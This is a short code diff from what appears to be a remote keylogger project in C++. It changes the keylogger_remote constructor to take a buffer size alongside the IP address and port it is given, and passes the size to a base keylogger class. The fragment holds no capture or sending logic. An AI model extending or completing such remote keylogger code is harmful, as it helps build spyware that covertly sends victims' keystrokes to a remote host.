@@ -1,6 +1,6 @@
 #include "./keylogger_remote.hpp"
 
-keylogger_remote::keylogger_remote(string p_ipd_address, int p_port)
+keylogger_remote::keylogger_remote(size_t p_buffer_size, string p_ipd_address, int p_port) : keylogger(p_buffer_size)
 {
 	a_socket = 0;
 
